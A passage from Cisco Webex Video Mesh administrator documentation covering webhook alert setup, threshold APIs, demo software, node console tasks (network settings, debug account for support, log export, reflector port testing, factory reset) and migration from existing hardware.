* Cluster Call Redirects – Calls redirected from a particular cluster.
* Org Call Overflows – Total call overflows to cloud for an organization.
#### Create a Webhook subscription

| 1 | Log in to the [Cisco Webex Developer](https://developer.webex.com/) portal using admin credentials. |
| --- | --- |
| 2 | On the developer portal, click  Documentation. |
| 3 | From the scroll bar on the left, scroll down and click Full API Reference. |
| 4 | From the options that expand below, scroll down, and click Webhooks > Create a Webhook. |
| 5 | Create a subscription by entering the following parameters: |

* **name**: example – Video Mesh Webhook alerts
* **targetUrl**: example - https://10.1.1.1/webhooks
* **resource**: videoMeshAlerts
* **event**: triggered
* **ownedBy**: org

The URL entered in the targetUrl parameter must be internet-accessible and have a server that is configured to accept POST requests sent by Webex Webhook.

#### Setting threshold configurations with developer APIs

You can set threshold values for the events (Org Call Overflows and Cluster Call Redirects) with Video Mesh developer APIs. You can set a percentage value for the thresholds, above which a webhook alert will be triggered. For example, if the threshold value is set to 20 for Org Call Overflows, an alert will be sent when more than 20 percent of the calls overflow to cloud.

A set of 4 APIs are available for setting and updating thresholds in the Cisco Webex Developer portal and they are listed below:

* List Event Threshold Configuration
* Get Event Threshold Configuration
* Update Event Threshold Configuration
* Reset Event Threshold Configuration

The APIs are available at <https://developer.webex.com/docs/api/v1/video-mesh>.

### Video Mesh Node Demo Software

Use the Video Mesh Node demo software only for basic demo purposes. Do not add a demo node to an existing production cluster. The demo cluster accepts fewer calls than production and expires 90 days after it is registered to the cloud.

* The Video Mesh Node demo software is not supported by the Cisco TAC.
* You cannot upgrade the Video Mesh Node demo software to the full production software version.

Download the demo software image from [this link](https://binaries.webex.com/hybridMediaMgmtDemo/videomesh_demo.ova).

#### Specifications

See [System and Platform Requirements for Video Mesh Node Software](#reference_B79B943FA0BB4A4D520153DA34B27663) for the specs-based configuration for Video Mesh Node software.

The demo software supports either a single network interface or a dual network interface.

#### Capacity

We do not test the demo image for capacity. You should only use it to test out basic meeting scenarios. See the use cases that follow for guidance.

#### Use Cases for the Video Mesh Node Demo Software

****Media Anchored to On-Premises****

* Deploy and configure the node with the demo software.
* Run a meeting that includes the following participants: a Webex App participant, Webex endpoint participant, and a Cisco Webex Board.
* After the meeting is over, from the customer view in <https://admin.webex.com>, go to Analytics to access the Video Mesh reports. In the reports, you can see that the media stayed on-premises.

****Meeting with Cloud and On-Premises Participants****

* Run another meeting with a couple of Webex participants on-premises and one in the cloud.
* Observe that all participants can seamlessly join and participate in the meeting.

### Manage Video Mesh Node From the Console

Before you can make any network changes to Video Mesh nodes that are registered to the cloud, you must use Control Hub to put them in maintenance mode. For more information and a procedure to follow, see [Move a Node Into Maintenance Mode](https://help.webex.com/article/nxep7tb).

Maintenance mode is intended solely to prepare a node for shutdown or reboot so that you can make certain networking setting changes (DNS, IP, FQDN) or prepare for hardware maintenance such as replace RAM, hard drive, and so on.

Upgrades do not happen when a node is placed in maintenance mode.

When you place a node into maintenance mode, it does a graceful shutdown of calling services (stops accepting new calls and waits up to 2 hours for existing calls to complete). The purpose of the graceful shutdown of calling services is to allow reboot or shutdown of the node without causing dropped calls.

#### Change Video Mesh Node Network Settings in the Console

If your network topology changes, you have to open the console interface for each Video Mesh node and change the network settings there. You may see a caution about changing the network settings, but you can still save the changes in case you're making changes to your network after changing Video Mesh node settings.

| 1 | Open the node console interface through the VMware vSphere client and then sign in using the admin credentials.  After first time setup of the network settings and if the Video Mesh is reachable, you can access the node interface through secure shell (SSH). |
| --- | --- |
| 2 | From the main menu of the Video Mesh Node console, choose option **2 Edit Configuration** and then click **Select**. |
| 3 | Read the prompt that the calls will end on the Video Mesh Node, and then click **Yes**. |
| 4 | Click Static, enter the IP address for the internal interface, Mask, Gateway, and **DNS** values for your network.   * The Video Mesh Node must have an internal IP address and resolvable DNS name. The node IP address must not belong to the IP address range reserved for Video Mesh Node internal use. The default reserved IP address range is 172.17.42.0–172.17.42.63, which can be configured in the **Diagnostic** menu. This IP address range is for communication within the Video Mesh Node and between the software containers which hold the different components of the node—for example, SIP interface and media transcoding. * Deploy all the nodes on the same subnet or VLAN, so that all nodes in a cluster are reachable from wherever the clients reside in your network. * For a dual NIC DMZ deployment, you can set the external IP address in the next procedure, after you've saved the internal network configuration and rebooted the node. |
| 5 | Enter your organization's NTP server or another external NTP server that can be used in your organization.  After you configure the NTP server and save network settings, you can follow the steps in [Check Health of Video Mesh Node From Console](#task_F3BFA4778B287661D1FD62CCA646C70B) to verify that the time is synchronizing correctly through the specified NTP servers.  If you configure more than one NTP servers, the poll interval for failover is 40 seconds. |
| 6 | (Optional) Change the hostname or domain, if required.   * To ensure a successful registration to the cloud, use only lowercase characters in the hostname that you set for the Video Mesh Node. Capitalization is not supported at this time. * When using or configuring FQDN or hostname, you must also enter a valid and resolvable domain. The total length of the FQDN must not exceed 64 characters. |
| 7 | Click **Save**, and then click **Save Changes & Reboot**.  During the save, DNS validation is performed if you provided a domain. A warning is displayed if the FQDN (hostname and domain) is not resolvable using the DNS server addresses provided. You may choose to save by ignoring the Warning, but calls will not work until the FQDN can resolve to the DNS configured on the node. After the Video Mesh Node reboots, the network configuration changes take effect. |

#### Change the Administrator Passphrase of the Video Mesh Node

Use this procedure to change the administrator passphrase (password) for your Video Mesh node in the node's console.

| 1 | Open the node console interface through the VMware vSphere client or SSH into a reachable IP address, and then sign in using the admin credentials. |
| --- | --- |
| 2 | Open and log in to the VMware ESXi console of the VM for your Video Mesh node. |
| 3 | In the main menu, choose option 3 Manage Administrator Passphrase, then 1 Change Administrator Passphrase, and then click Enter. |
| 4 | Read the information on the password expired page, click Enter, and then click it again after the password expiry message. |
| 5 | Press Enter. |
| 6 | After you're signed out of the console, go back to the sign in screen, and then sign in using the admin login and passphrase (password) that you expired. You are prompted to change your password. |
| 7 | For Old password, enter the current passphrase, and then press Enter. |
| 8 | For New password, enter a new passphrase, and then press Enter. |
| 9 | For Re-enter new password, retype the new passphrase, and then press Enter. A "password changed" message appears and then you go back to the sign in screen. |
| 10 | Sign in using your new admin login and passphrase (password). |

#### Run a Ping from Video Mesh Node Console

You can run a ping from the Video Mesh node console interface. This step tests a destination you enter and sees if the Video Mesh node can reach it.

| 1 | Open the node console interface through the VMware vSphere client or SSH into a reachable IP address, and then sign in using the admin credentials. |
| --- | --- |
| 2 | From the Video Mesh node console, go to **4 Diagnostics**, and then choose **Ping**. |
| 3 | In the **ping** field, enter a destination address that you want to test, such as an IP address or hostname, and then click **OK**.  The test runs and you'll see a ping success or failure message. If you receive a failure, check the destination value that you entered and your network settings. |

#### Enable Debug User Account Through Console

If support requires access to the Video Mesh node, you can use the console interface to temporarily enable a debug user account so that support can run further troubleshooting on your node.

| 1 | Open the node console interface through the VMware vSphere client or SSH into a reachable IP address, and then sign in using the admin credentials. |
| --- | --- |
| 2 | From the Video Mesh node console, go to 4 Diagnostics, choose 2 Enable Debug User Account, and after the prompt, click Yes. |
| 3 | After a message appears that the debug user account was created successfully, click OK to show the encrypted passphrase.  You'll send the encrypted passphrase to support. They use this temporary account and decrypted passphrase to securely access your Video Mesh node for troubleshooting. This account expires after 3 days, or you can disable it when support is finished. |
| 4 | Select the start and end of the encrypted data, and copy-paste it into the support ticket or email that you're sending to support. |
| 5 | After you send this information to support, return to the Video Mesh node console and press any key to go back to the main menu. |

What to do next

The account expires in 3 days, but when support indicates that they finished troubleshooting on the node, you can return the Video Mesh node console, go to 4 Diagnostics, and then choose 3 Disable Debug User Account to disable the account before it expires.

#### Send Logs from Video Mesh Node Console

You may be instructed to send logs directly to Cisco or through secure copy (SCP). Use this procedure to send logs directly from any Video Mesh nodes that you registered to the cloud.

| 1 | Open the node console interface through the VMware vSphere client or SSH into a reachable IP address, and then sign in using the admin credentials. |
| --- | --- |
| 2 | In the main menu, click option 4 Diagnostics and then press Enter. |
| 3 | Click 4 Export Log Files, provide feedback if you want, and then click Next. |
| 4 | Choose an option:   * Send Logs using SCP, confirm the export of the logs, enter the SCP details (**Host**, **Username**, and **Dest\_Folder**), and then click OK. * Send Logs to Cisco, and then confirm the export of the logs. |
| 5 | Choose OK to return to the Video Mesh node main menu. |
| 6 | (Optional) Choose 5 Check Status of Log Files Sent to Cisco if you sent the logs to Cisco. |

What to do next

After you send logs, we recommend that you send feedback directly from the Webex App so that your support contacts have all the information that they need to help you.

#### Check Health of Video Mesh Node From Console

You can view the node health directly from the Video Mesh node itself. The results are informational, but could aid in troubleshooting steps—for example, if NTP synchronization is not working, you can check the NTP server value in the network settings.

| 1 | Open the node console interface through the VMware vSphere client or SSH into a reachable IP address, and then sign in using the admin credentials. |
| --- | --- |
| 2 | From the Video Mesh node console, go to 4 Diagnostics, and then choose 6 Check Node Health to view the following information about the node:   * **Management Service Container** * **ETCD** (key value store that reliably stores data across a cluster) * **NTP Synchronized** * **Disk Space (Free/Used%)** * **Memory (Free/Used%)** |

#### Configure Container Network on Video Mesh Node

Video Mesh node reserves a subnet range for internal use within the node. The default range is 172.17.42.0–172.17.42.63. The nodes do not respond to any external-to-Video Mesh node traffic originating from this range. You may want to use the node console to change the container bridge IP address to avoid conflicts with other devices in your network.

| 1 | Open the node console interface through the VMware vSphere client or SSH into a reachable IP address, and then sign in using the admin credentials. |
| --- | --- |
| 2 | From the main menu of the Video Mesh node console, go to 4 Diagnostics, and then choose 7 Configure Container Network. After the caution that states that active calls will end on the node, click Yes. |
| 3 | Change the values for Container Bridge IP and Network Mask, as needed, and then click Save.  You'll see a screen that shows the container network information, including the IP address range reserved for internal operations on the Video Mesh node. |
| 4 | Click OK. |

#### Identify Port Issues With Reflector Tool in Console

The reflector tool (a combination of a server on the Video Mesh node and client through a Python script) is used to verify whether the required TCP/UDP ports are open from Video Mesh nodes.

Before you begin

* Download a copy of the [Reflector Tool Client (Python script)](https://www.cisco.com/c/dam/en/us/td/docs/voice_ip_comm/cloudCollaboration/spark/hybridservices/mediaservice/deployment/qos/reflectorClient.zip) and then unzip the file to a location that's easy to find. The zip file contains the script and a readme file.
* For the script to work properly, ensure that you're running Python 2.7.10 or later in your environment.
* Currently, this tool supports SIP endpoints to Video Mesh nodes and intracluster verification.

| 1 | From the customer view in <https://admin.webex.com>, enable maintenance node for the Video Mesh Node by following [these instructions](https://collaborationhelp.cisco.com/article/nxep7tb). |
| --- | --- |
| 2 | Wait for the node to show a 'Ready for maintenance' status in Control Hub. |
| 3 | Open the node console interface through the VMware vSphere client or SSH into a reachable IP address, and then sign in using the admin credentials. |
| 4 | From the Video Mesh Node interface, go to **Diagnostics > Reflector Server > Reflector Server for TCP or (UDP)**. Start the server either for TCP or for UDP. |
| 5 | Scroll to Reflector Tool, and then start either the TCP Reflector Server or UDP Reflector Server, depending on what protocol you want to use. |
| 6 | Click Start Reflector Server, and then wait for the server to start successfully.  You'll see a notice when the server starts. |
| 7 | From a system (such as a PC) on a network that you want Video Mesh nodes to reach, run the script with the following command:  ``` $ python <local_path_to_client_script>/reflectorClient.py --ip <ip address of the server> --protocol <tcp or udp> ```   At the end of the run, the client shows a success message if all the required ports are open:    The client shows a failed message if any required ports are not open: |
| 8 | Resolve any port issues on the firewall and then rerun the above steps. |
| 9 | Run the client with `--help` to get more details. |

#### Factory Reset a Video Mesh Node From Console

As part of deregistration cleanup, you can factory reset the Video Mesh node. This step removes any configuration you put in place while the node was active, but does not remove the virtual machine entry. Later, you may want to reregister this node as part of another cluster that you build from scratch.

Before you begin

You must use Control Hub to deregister the Video Mesh node from the cluster that's registered in Control Hub.

| 1 | Open the node console interface through the VMware vSphere client or SSH into a reachable IP address, and then sign in using the admin credentials. |
| --- | --- |
| 2 | From the Video Mesh node console, go to 4 Diagnostics, and then choose 8 Factory Reset. |
| 3 | Ensure that you understand the information in the note that appears, and then click Reset.  The node reboots automatically after the factory reset. |

### Migrate an Existing Hardware Platform to Video Mesh Node

You can migrate an existing supported platform (for example, a CMS1000 that runs Cisco Meeting Server) to Video Mesh. Use this procedure to guide you through the migration process.

The steps vary, depending on the bundled version of ESXi on the hardware platform.

Before you begin

Download a new copy of the latest [Video Mesh Node software](https://7f3b835a2983943a12b7-f3ec652549fc8fa11516a139bfb29b79.ssl.cf5.rackcdn.com/Media-Fusion-Management-Connector/mfusion.ova) image (OVA). Do not deploy a new Video Mesh node with a previously downloaded OVA.

| 1 | Sign into the virtual machine interface and then shut down the software that is running on the platform. |
| --- | --- |
| 2 | Delete the software application that was running on the platform.  There must be no software images remaining on the platform. Also, you cannot run Video Mesh node software alongside other software on the same platform. |
| 3 | Deploy a new virtual machine from a new OVF or OVA file. |
| 4 | Enter a name for the virtual machine and choose the Video Mesh node OVA file. |
| 5 | Change disk provisioning to Thick. |
| 6 | Upload the **mfusion.ova** software image that you downloaded. |
| 7 | When the virtual machine is running, return to [Log in to the Video Mesh Node Console](#CMGT_TK_S7ADF3D5_00) and continue initial configuration of the Video Mesh node. |

#### Migration Path Checklist

Below is a high-level overview of how to migrate an existing site to video platform version 2.0 and prepare the site to integrate with Video Mesh. The steps may vary, depending on your existing environment. Work with your partner or [customer success manager](https://collaborationhelp.cisco.com/article/WBX15) to ensure a smooth migration.

1. Make sure that the Meeting Center Video conferencing feature is provisioned on the Webex site.
2. The site admin receives their management portal account. The admin then deploys Video Mesh nodes for the Webex organization.
3. The site admin assigns the CMR privilege to enable all or some CMR Hybrid users with Cisco Webex Meeting Center Video.
4. (Optional) Disable the CMR Hybrid session type for this subset, and then enable Cisco Webex Meeting Center Video in their user profile.
5. The site admin sets up Video Mesh, and then selects **Hybrid** as the media resource type under **Cloud Collaboration Meeting Room Options**.
6. The site admin sets up on-premises TelePresence Management Suite (TMS) and One Button to Push (OBTP) to work with Cisco Webex Meeting Center Video. See the [*Cisco Webex Meeting Center Video Conferencing Enterprise Deployment Guide*](https://collaborationhelp.cisco.com/article/nmdp0hq) for guidance.
7. When the CMR privilege is enabled for a user, the Webex Productivity Tools default to the Cisco Webex Meeting Center Video version. All new meetings scheduled by the users are Cisco Webex Meeting Center Video meetings.
8. If conference rooms are included in the invite, OBTP information is pushed to the conference room through TMS (for CMR Hybrid meetings only).
9. Existing meetings that were set up by CMR Hybrid users before they were switched to Cisco Webex Meeting Center Video should continue to work as long as the customer preserves the on-premises MCU and TMS settings.
10. Existing CMR Hybrid meetings cannot be modified or updated to reflect the Cisco Webex Meeting Center Video meeting information. If users want to use new invitation, they must delete the old meetings and create new meetings.
11. If the customer wishes to retire the on-premises MCU, TMS, old CMR Hybrid meetings will not work. New meetings with Cisco Webex Meeting Center Video information must be created.
